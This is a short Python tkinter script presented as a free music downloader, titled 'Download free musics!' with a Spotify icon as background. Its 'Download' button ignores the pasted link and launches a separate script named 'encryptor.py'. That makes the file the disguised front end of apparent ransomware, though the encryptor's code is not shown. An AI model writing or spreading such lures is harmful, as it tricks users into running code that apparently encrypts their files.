import tkinter as tk
from PIL import Image, ImageTk  # pip install pillow
import subprocess

def run_script():
    subprocess.Popen(["python3", "encryptor.py"])

def main():
    root = tk.Tk()
    root.title("Download free musics!")

    root.geometry("500x500")

    # Load background image
    bg_image = Image.open("Spotify_icon.svg.png")
    bg_image = bg_image.resize((500, 500))
    bg_photo = ImageTk.PhotoImage(bg_image)

    # Create canvas
    canvas = tk.Canvas(root, width=500, height=500)
    canvas.pack(fill="both", expand=True)

    # Set background image
    canvas.create_image(0, 0, image=bg_photo, anchor="nw")

    # --- Text input field ---
    link_entry = tk.Entry(root, width=40, font=("Arial", 12))
    link_entry.insert(0, "Paste link here...")

    # --- Button ---
    start_button = tk.Button(root, text="Download", font=("Arial", 16), command=run_script)

    # Place widgets on canvas
    canvas.create_window(250, 200, window=link_entry)
    canvas.create_window(250, 260, window=start_button)

    root.mainloop()

if __name__ == "__main__":
    main()